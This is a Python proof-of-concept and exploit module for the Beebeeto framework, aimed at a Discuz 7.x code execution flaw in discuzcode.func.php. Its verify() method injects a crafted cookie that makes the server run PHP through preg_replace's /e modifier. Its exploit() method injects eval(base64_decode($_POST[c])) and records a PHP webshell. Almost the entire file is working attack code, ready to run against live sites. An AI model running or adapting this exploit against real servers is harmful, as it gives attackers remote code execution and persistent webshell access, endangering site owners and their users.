#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import re
import urllib
import urllib2


from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0143',
            'name': 'Discuz 7.x /include/discuzcode.func.php 代码执行漏洞 POC & Exploit',
            'author': 'root',
            'create_date': '2014-11-11',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'Discuz',
            'vul_version': ['7.x'],
            'type': 'Code Execution',
            'tag': ['Discuz漏洞', '代码执行漏洞', 'php', '/include/discuzcode.func.php'],
            'desc': '/include/discuzcode.func.php 中preg_replace执行了全局变量，全局变量可cookie提交导致任意代码执行',
            'references': ['http://wooyun.org/bugs/wooyun-2014-079582',
            ],
        },
    }

    @classmethod
    def get_verify_url(self, url):
        verify_url_list = ['']
        match_result = re.compile('(redirect\.php\?tid=\d+&amp;goto=lastpost|viewthread\.php\?tid=\d+)')   
        request = urllib2.Request(url)
        resp = urllib2.urlopen(request)
        verify_url_list = match_result.findall(resp.read())
        return verify_url_list


    @classmethod
    def verify(cls, args):
        url = args['options']['target']
        payload = ("GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE]"
                   "[smilies][replacearray]=var_dump(md5(564883737458362684));")
        headers = {}
        headers['Cookie'] = payload
        url_list = cls.get_verify_url(url)
        if url_list:
            for verify_url in url_list:
                try:
                    verify_url = verify_url.replace('&amp;','&')
                    test_url = url + "/" + verify_url
                    request = urllib2.Request(test_url, headers=headers)
                    html = urllib2.urlopen(request).read()
                    if '0bc3007107b28d15c86a14b2b0302daa' in html:
                        args['success'] = True
                        args['poc_ret']['vul_url'] = test_url
                        args['poc_ret']['Cookie'] = payload
                    return args
                except urllib2.URLError,e:
                    pass
        return args


    @classmethod
    def exploit(cls, args):
        url = args['options']['target']
        payload = ("GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies]"
                   "[replacearray]=eval(base64_decode($_POST[c]));")
        headers = {}
        headers['Cookie'] = payload
        url_list = cls.get_verify_url(url)
        if url_list:
            for verify_url in url_list:
                try:
                    verify_url = verify_url.replace('&amp;','&')
                    test_url = url + "/" + verify_url
                    postdata = 'c=ZWNobyBtZDUoJyFAMmVBR2RAI0EnKTs='
                    request = urllib2.Request(test_url, data=postdata, headers=headers)
                    html = urllib2.urlopen(request).read()
                    if 'a47d1b3ad5c88fe78963e4d9354edf04' in html:
                        args['success'] = True
                        args['poc_ret']['vul_url'] = test_url
                        args['poc_ret']['Cookie'] = payload
                        args['poc_ret']['Webshell']['Content'] = '<?php eval(base64_decode($_POST[c])); ?>'
                    return args
                except urllib2.URLError,e:
                    pass
        return args

if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())